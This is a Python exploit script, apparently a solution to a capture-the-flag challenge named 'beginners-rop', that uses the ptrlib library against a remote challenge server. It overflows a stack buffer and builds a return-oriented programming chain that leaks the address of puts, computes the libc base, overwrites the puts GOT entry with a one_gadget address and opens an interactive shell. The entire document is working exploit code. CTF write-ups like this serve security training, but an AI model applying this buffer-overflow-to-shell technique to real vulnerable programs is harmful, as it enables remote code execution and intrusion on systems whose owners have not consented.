from ptrlib import *

elf = ELF("./chall")

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc-2.27.so")
# sock = Socket("localhost", 9999)
sock = Socket("nc beginners-rop.quals.beginners.seccon.jp 4102")

# puts(puts@got) to get libc_base
# gets(puts@got) and do overwrite puts@got <- one gadget
# puts(........) then got the shell

input("connected")

payload = b"A" * (0x100 + 8)
  
# puts(puts@got)
payload += p64(0x0000000000401283)  # pop rdi ; ret
payload += p64(elf.got("puts"))
payload += p64(elf.plt("puts"))

# gets(puts@got)
payload += p64(0x0000000000401283)  # pop rdi ; ret
payload += p64(elf.got("puts"))
payload += p64(elf.plt("gets"))

# puts something (launch one gadget) 
payload += p64(elf.plt("puts"))


# ---

sock.sendline(payload)
print(sock.recvline())
puts_got = u64(sock.recvline())
libc_base = puts_got - libc.symbol("puts")
print("[+] libc_base: {:x}".format(libc_base))

# send one_gadget
sock.sendline(p64(libc_base + 0x4f432))

sock.interactive()
